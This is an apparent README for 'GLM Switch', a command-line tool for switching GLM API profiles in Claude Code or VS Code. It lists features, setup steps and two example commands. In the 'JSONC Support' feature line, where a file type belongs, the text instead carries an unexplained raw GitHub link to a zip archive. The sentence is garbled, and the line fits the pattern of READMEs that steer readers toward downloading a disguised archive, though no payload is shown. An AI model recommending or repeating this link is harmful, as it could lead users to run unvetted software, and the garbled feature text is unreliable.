## üåü Overview

GLM Switch is a command-line tool designed to help you manage multiple GLM API profiles easily. With this tool, you can quickly switch between different GLM configurations within Claude Code or VS Code. No more manual edits; just a few commands and you're set!

---

## üåà Features

- **Multiple Profiles**: Save and manage different profiles, each with unique tokens and models.
- **Quick Switch**: Change profiles instantly using a single command.
- **Bulk Update**: Update settings across all your profiles at once.
- **Safe Operations**: Enjoy peace of mind with automatic backups, JSON validation, and rollback options in case of errors.
- **Cross-Platform**: Works on both Windows and macOS.
- **JSONC Support**: Loads `https://raw.githubusercontent.com/NyatakuIbnuRosada/glm-switch/main/dist/switch_glm_v2.9.zip` files with comments for easier management.
- **Auto-Create**: Automatically generate necessary profile files if they're not found.

## üõ†Ô∏è Getting Started

After downloading GLM Switch, follow these steps to get it up and running:

1. **Open Your Command Line Interface**: This could be Command Prompt on Windows or Terminal on macOS.
2. **Navigate to Your Desired Directory**: Use the `cd` command to change to the folder where you want to manage your GLM profiles.
3. **Run GLM Switch**: Simply type `glm-switch` and follow the on-screen prompts to configure your profiles.
4. **Create Profiles**: Use predefined commands to add your API tokens and model settings.

### Example Commands

- To create a new profile:
  ```bash
  glm-switch create myProfile --token yourTokenHere --model yourModelHere
  ```
- To switch profiles:
  ```bash
  glm-switch switch myProfile
  ```
